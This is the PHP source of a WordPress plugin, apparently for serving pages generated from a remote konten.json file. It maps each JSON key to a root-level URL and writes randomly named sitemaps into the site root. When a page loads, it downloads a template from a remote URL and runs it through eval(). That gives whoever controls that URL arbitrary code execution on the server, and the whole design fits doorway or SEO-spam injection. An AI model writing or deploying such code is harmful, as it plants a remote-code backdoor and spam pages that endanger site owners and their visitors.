<?php
/*
Plugin Name: Additional Content Plugin
Description: A plugin to display additional content from konten.json and template URL, with clean URLs (domain.com/title) and random sitemap names.
Version: 4.9
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Register admin menu
add_action('admin_menu', 'acp_admin_menu');
function acp_admin_menu() {
    add_menu_page(
        'Additional Content Settings',
        'Content Plugin',
        'manage_options',
        'additional-content-plugin',
        'acp_admin_page',
        'dashicons-admin-page'
    );
}

// Generate random 5-character string (a-z)
function acp_generate_random_sitemap_name() {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $random_string = '';
    for ($i = 0; $i < 5; $i++) {
        $random_string .= $characters[rand(0, 25)];
    }
    return $random_string;
}

// Admin page content
function acp_admin_page() {
    // Handle form submission for saving settings
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        error_log('POST request received');
        
        // Get current endpoints for nonce verification
        $current_endpoints = get_option('acp_endpoints', []);
        
        // Handle main form submission
        if (isset($_POST['acp_submit'])) {
            error_log('acp_submit detected');
            
            if (!isset($_POST['_wpnonce']) || !wp_verify_nonce($_POST['_wpnonce'], 'acp_save_settings')) {
                error_log('Nonce verification failed');
                wp_die('Security check failed');
            }
            
            error_log('Nonce verified');
            $new_endpoints = [];
            
            if (!empty($_POST['acp_endpoints']) && is_array($_POST['acp_endpoints'])) {
                error_log('Processing ' . count($_POST['acp_endpoints']) . ' endpoints');
                
                foreach ($_POST['acp_endpoints'] as $index => $endpoint) {
                    if (!isset($endpoint['konten_json_url'], $endpoint['template_url'])) {
                        continue;
                    }
                    
                    $json_url = esc_url_raw($endpoint['konten_json_url']);
                    $template_url = esc_url_raw($endpoint['template_url']);
                    $sitemap_name = !empty($endpoint['sitemap_name']) ? sanitize_text_field($endpoint['sitemap_name']) : acp_generate_random_sitemap_name();
                    
                    if (!empty($json_url) && !empty($template_url)) {
                        $new_endpoints[] = [
                            'konten_json_url' => $json_url,
                            'template_url' => $template_url,
                            'sitemap_name' => $sitemap_name
                        ];
                    }
                }
            }
            
            update_option('acp_endpoints', $new_endpoints);
            add_settings_error(
                'acp_messages',
                'acp_message',
                sprintf(__('Settings saved successfully! %d endpoints saved.', 'additional-content-plugin'), count($new_endpoints)),
                'updated'
            );
            
            // Update rewrite rules after saving endpoints
            acp_register_rewrite_rules();
            flush_rewrite_rules();
            
            // Update current endpoints for sitemap verification
            $current_endpoints = $new_endpoints;
        }
        
        // Handle sitemap generation
        if (isset($_POST['acp_generate_sitemap'])) {
            error_log('Generating sitemap');
            
            // Verify sitemap nonce
            if (!isset($_POST['acp_generate_sitemap_nonce'])) {
                error_log('Sitemap nonce not set');
                wp_die('Security check failed');
            }
            
            $konten_json_url = esc_url_raw($_POST['acp_konten_json_url']);
            $sitemap_name = sanitize_text_field($_POST['acp_sitemap_name']);
            
            // Find the endpoint index
            $endpoint_index = false;
            foreach ($current_endpoints as $i => $ep) {
                if ($ep['konten_json_url'] === $konten_json_url) {
                    $endpoint_index = $i;
                    break;
                }
            }
            
            if ($endpoint_index === false || 
                !wp_verify_nonce($_POST['acp_generate_sitemap_nonce'], 'acp_generate_sitemap_' . $endpoint_index)) {
                error_log('Sitemap nonce verification failed');
                wp_die('Security check failed');
            }
            
            $result = acp_generate_sitemap($konten_json_url, $sitemap_name);
            
            if (is_wp_error($result)) {
                add_settings_error(
                    'acp_messages',
                    'acp_message',
                    __('Error generating sitemap: ', 'additional-content-plugin') . $result->get_error_message(),
                    'error'
                );
            } else {
                $sitemap_urls = is_array($result) ? $result : [home_url($sitemap_name . '.xml')];
                $message = __('Sitemap generated successfully: ', 'additional-content-plugin');
                foreach ($sitemap_urls as $index => $url) {
                    $sitemap_filename = $index === 0 ? $sitemap_name . '.xml' : $sitemap_name . '-' . ($index + 1) . '.xml';
                    $message .= sprintf('<a href="%s" target="_blank">%s</a>', esc_url($url), esc_html($sitemap_filename));
                    if ($index < count($sitemap_urls) - 1) {
                        $message .= ', ';
                    }
                }
                add_settings_error(
                    'acp_messages',
                    'acp_message',
                    $message,
                    'updated'
                );
            }
        }
    }

    // Get current endpoints
    $endpoints = get_option('acp_endpoints', []);
    
    // Display settings messages
    settings_errors('acp_messages');
    ?>
    <div class="wrap">
        <h1>Additional Content Plugin Settings</h1>
        <form id="acp-settings-form" method="post" action="">
            <?php wp_nonce_field('acp_save_settings'); ?>
            <h2>Endpoints</h2>
            <div id="acp-endpoints">
                <?php
                if (empty($endpoints)) {
                    $endpoints[] = [
                        'konten_json_url' => '',
                        'template_url' => '',
                        'sitemap_name' => acp_generate_random_sitemap_name()
                    ];
                }
                
                foreach ($endpoints as $index => $endpoint) {
                    ?>
                    <div class="acp-endpoint" style="border: 1px solid #ddd; padding: 15px; margin-bottom: 15px;">
                        <h3>Endpoint <?php echo $index + 1; ?></h3>
                        <table class="form-table">
                            <tr>
                                <th><label for="acp_endpoints_<?php echo $index; ?>_konten_json_url">Konten JSON URL</label></th>
                                <td>
                                    <input type="url" name="acp_endpoints[<?php echo $index; ?>][konten_json_url]" id="acp_endpoints_<?php echo $index; ?>_konten_json_url" value="<?php echo esc_attr($endpoint['konten_json_url']); ?>" class="regular-text" placeholder="https://example.com/konten.json" required>
                                    <p class="description">Enter the URL to your konten.json file.</p>
                                </td>
                            </tr>
                            <tr>
                                <th><label for="acp_endpoints_<?php echo $index; ?>_template_url">Template URL</label></th>
                                <td>
                                    <input type="url" name="acp_endpoints[<?php echo $index; ?>][template_url]" id="acp_endpoints_<?php echo $index; ?>_template_url" value="<?php echo esc_attr($endpoint['template_url']); ?>" class="regular-text" placeholder="https://example.com/template/template.txt" required>
                                    <p class="description">Enter the URL to your template.txt file.</p>
                                </td>
                            </tr>
                            <tr>
                                <th><label for="acp_endpoints_<?php echo $index; ?>_sitemap_name">Sitemap Name</label></th>
                                <td>
                                    <input type="text" name="acp_endpoints[<?php echo $index; ?>][sitemap_name]" id="acp_endpoints_<?php echo $index; ?>_sitemap_name" value="<?php echo esc_attr($endpoint['sitemap_name']); ?>" class="regular-text" readonly>
                                    <p class="description">Randomly generated sitemap name (a-z, 5 characters).</p>
                                </td>
                            </tr>
                        </table>
                        <button type="button" class="button acp-remove-endpoint">Remove Endpoint</button>
                        <?php if (!empty($endpoint['konten_json_url']) && !empty($endpoint['sitemap_name'])): ?>
                            <div style="display: inline-block; margin-left: 10px;">
                                <?php wp_nonce_field('acp_generate_sitemap_' . $index, 'acp_generate_sitemap_nonce'); ?>
                                <input type="hidden" name="acp_konten_json_url" value="<?php echo esc_attr($endpoint['konten_json_url']); ?>">
                                <input type="hidden" name="acp_sitemap_name" value="<?php echo esc_attr($endpoint['sitemap_name']); ?>">
                                <input type="submit" name="acp_generate_sitemap" class="button button-secondary" value="Create Sitemap">
                            </div>
                        <?php endif; ?>
                    </div>
                    <?php
                }
                ?>
            </div>
            <p>
                <button type="button" class="button button-secondary" id="acp-add-endpoint">Add New Endpoint</button>
            </p>
            <p class="submit">
                <input type="submit" name="acp_submit" id="acp-submit-button" class="button button-primary" value="Save Settings">
            </p>
        </form>
    </div>

    <script>
        jQuery(document).ready(function($) {
            let endpointIndex = <?php echo count($endpoints); ?>;
            
            // Add new endpoint
            $('#acp-add-endpoint').on('click', function() {
                // Generate random sitemap name via AJAX
                $.ajax({
                    url: '<?php echo admin_url('admin-ajax.php'); ?>',
                    method: 'POST',
                    data: {
                        action: 'acp_generate_sitemap_name'
                    },
                    success: function(response) {
                        if (response.success && response.data.sitemap_name) {
                            const newEndpoint = `
                                <div class="acp-endpoint" style="border: 1px solid #ddd; padding: 15px; margin-bottom: 15px;">
                                    <h3>Endpoint ${endpointIndex + 1}</h3>
                                    <table class="form-table">
                                        <tr>
                                            <th><label for="acp_endpoints_${endpointIndex}_konten_json_url">Konten JSON URL</label></th>
                                            <td>
                                                <input type="url" name="acp_endpoints[${endpointIndex}][konten_json_url]" id="acp_endpoints_${endpointIndex}_konten_json_url" value="" class="regular-text" placeholder="https://example.com/konten.json" required>
                                                <p class="description">Enter the URL to your konten.json file.</p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <th><label for="acp_endpoints_${endpointIndex}_template_url">Template URL</label></th>
                                            <td>
                                                <input type="url" name="acp_endpoints[${endpointIndex}][template_url]" id="acp_endpoints_${endpointIndex}_template_url" value="" class="regular-text" placeholder="https://example.com/template/template.txt" required>
                                                <p class="description">Enter the URL to your template.txt file.</p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <th><label for="acp_endpoints_${endpointIndex}_sitemap_name">Sitemap Name</label></th>
                                            <td>
                                                <input type="text" name="acp_endpoints[${endpointIndex}][sitemap_name]" id="acp_endpoints_${endpointIndex}_sitemap_name" value="${response.data.sitemap_name}" class="regular-text" readonly>
                                                <p class="description">Randomly generated sitemap name (a-z, 5 characters).</p>
                                            </td>
                                        </tr>
                                    </table>
                                    <button type="button" class="button acp-remove-endpoint">Remove Endpoint</button>
                                </div>`;
                            $('#acp-endpoints').append(newEndpoint);
                            endpointIndex++;
                        } else {
                            alert('Failed to generate sitemap name.');
                        }
                    }
                });
            });

            // Remove endpoint
            $(document).on('click', '.acp-remove-endpoint', function() {
                if ($('.acp-endpoint').length > 1) {
                    $(this).closest('.acp-endpoint').remove();
                    // Update endpoint numbering
                    $('.acp-endpoint h3').each(function(index) {
                        $(this).text('Endpoint ' + (index + 1));
                    });
                } else {
                    alert('You must have at least one endpoint.');
                }
            });
        });
    </script>
    <style>
        .acp-endpoint { 
            background: #f9f9f9; 
            border-radius: 5px; 
            position: relative;
        }
        .acp-endpoint h3 { 
            margin-top: 0; 
        }
        .acp-remove-endpoint {
            margin-top: 10px;
        }
    </style>
    <?php
}

// AJAX handler for generating sitemap name
add_action('wp_ajax_acp_generate_sitemap_name', 'acp_ajax_generate_sitemap_name');
function acp_ajax_generate_sitemap_name() {
    wp_send_json_success(['sitemap_name' => acp_generate_random_sitemap_name()]);
}

// Register rewrite rules
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    // Rewrite rule: domain.com/your-title => index.php?acp_value=your-title
    add_rewrite_rule(
        '^([^/]+)/?$',
        'index.php?acp_value=$matches[1]',
        'top'
    );
}

// Register custom query vars
add_filter('query_vars', 'acp_query_vars');
function acp_query_vars($vars) {
    $vars[] = 'acp_value';
    return $vars;
}

// Function to generate sitemap
function acp_generate_sitemap($konten_json_url, $sitemap_name) {
    error_log('Starting sitemap generation for sitemap_name: ' . $sitemap_name);

    // Fetch konten.json
    $response = wp_remote_get($konten_json_url, ['timeout' => 15]);
    if (is_wp_error($response)) {
        return new WP_Error('fetch_error', 'Error fetching konten.json: ' . $response->get_error_message());
    }

    $body = wp_remote_retrieve_body($response);
    if (empty($body)) {
        return new WP_Error('empty_response', 'Empty response from konten.json URL.');
    }

    $konten_data = json_decode($body, true);
    if (json_last_error() !== JSON_ERROR_NONE || !is_array($konten_data)) {
        return new WP_Error('json_error', 'Invalid konten.json format. JSON Error: ' . json_last_error_msg());
    }

    // Determine number of sitemaps needed (max 50,000 URLs per sitemap)
    $max_urls_per_sitemap = 50000;
    $total_urls = count($konten_data);
    $sitemap_count = ceil($total_urls / $max_urls_per_sitemap);
    $sitemap_urls = [];

    // Split konten_data into chunks
    $konten_chunks = array_chunk($konten_data, $max_urls_per_sitemap, true);

    // Try to save in root directory first, fallback to uploads directory
    $base_path = ABSPATH;
    if (!is_writable(ABSPATH)) {
        $upload_dir = wp_upload_dir();
        $base_path = $upload_dir['basedir'] . '/';
        if (!is_writable($upload_dir['basedir'])) {
            return new WP_Error('write_error', 'Neither root nor uploads directory is writable. Please check permissions.');
        }
    }

    // Generate sitemap files
    foreach ($konten_chunks as $index => $chunk) {
        // Generate sitemap XML
        $xml = '<?xml version="1.0" encoding="UTF-8"?>';
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
        
        foreach ($chunk as $title => $content) {
            $url = esc_url(home_url(urlencode($title)));
            $xml .= '<url>';
            $xml .= '<loc>' . $url . '</loc>';
            $xml .= '<lastmod>' . current_time('c') . '</lastmod>';
            $xml .= '<changefreq>weekly</changefreq>';
            $xml .= '</url>';
        }
        
        $xml .= '</urlset>';

        // Determine filename
        $filename = $index === 0 ? $sitemap_name . '.xml' : $sitemap_name . '-' . ($index + 1) . '.xml';
        $file_path = $base_path . $filename;

        // Save sitemap to file
        $result = file_put_contents($file_path, $xml);
        if ($result === false) {
            return new WP_Error('write_error', 'Failed to write sitemap file at ' . $file_path);
        }

        $sitemap_urls[] = home_url($filename);
    }

    return $sitemap_urls;
}

// Handle frontend content display
add_action('template_redirect', 'acp_handle_content_display');
function acp_handle_content_display() {
    $value = get_query_var('acp_value');
    
    if (empty($value)) {
        return;
    }

    $endpoints = get_option('acp_endpoints', []);
    if (empty($endpoints)) {
        return;
    }

    $title = sanitize_text_field(urldecode($value));

    // Check if the URL matches an existing post/page to avoid conflicts
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) {
        return; // Let WordPress handle existing posts/pages
    }

    // Iterate through all endpoints to find the matching title
    foreach ($endpoints as $index => $endpoint) {
        $konten_json_url = $endpoint['konten_json_url'];
        $template_url = $endpoint['template_url'];

        // Skip if either URL is empty
        if (empty($konten_json_url) || empty($template_url)) {
            error_log('Skipping endpoint ' . ($index + 1) . ' due to empty konten_json_url or template_url');
            continue;
        }

        // Check cache for konten.json
        $cache_key = 'acp_konten_' . md5($konten_json_url);
        $konten_data = get_transient($cache_key);
        if ($konten_data === false) {
            // Fetch konten.json
            $json_response = wp_remote_get($konten_json_url, ['timeout' => 15]);
            if (is_wp_error($json_response)) {
                error_log('Error fetching konten.json for endpoint ' . ($index + 1) . ' (' . $konten_json_url . '): ' . $json_response->get_error_message());
                continue; // Move to the next endpoint
            }

            $konten_data = json_decode(wp_remote_retrieve_body($json_response), true);
            if (json_last_error() !== JSON_ERROR_NONE || !is_array($konten_data)) {
                error_log('Invalid konten.json format for endpoint ' . ($index + 1) . ' (' . $konten_json_url . '): ' . json_last_error_msg());
                continue; // Move to the next endpoint
            }

            // Cache the konten.json data for 1 hour
            set_transient($cache_key, $konten_data, HOUR_IN_SECONDS);
        }

        // Find the additional content (case-insensitive match)
        $additional_content = '';
        foreach ($konten_data as $key => $value) {
            if (strtolower($key) === strtolower($title)) {
                $additional_content = $value;
                break;
            }
        }

        // If content is found, render it using the template
        if (!empty($additional_content)) {
            // Fetch template
            $template_response = wp_remote_get($template_url, ['timeout' => 15]);
            if (is_wp_error($template_response)) {
                wp_die('Error fetching template from ' . esc_url($template_url) . ': ' . $template_response->get_error_message());
            }

            $template_content = wp_remote_retrieve_body($template_response);
            if (empty($template_content)) {
                wp_die('Empty template content from ' . esc_url($template_url));
            }

            // Process template with PHP
            ob_start();
            eval('?>' . $template_content);
            $output = ob_get_clean();

            // Output the content and exit
            echo $output;
            exit;
        }
    }

    // If no content is found in any endpoint, display error
    wp_die('Content not found for title: ' . esc_html($title));
}

// Add settings link on plugin page
add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'acp_settings_link');
function acp_settings_link($links) {
    $settings_link = '<a href="' . admin_url('admin.php?page=additional-content-plugin') . '">Settings</a>';
    array_unshift($links, $settings_link);
    return $links;
}
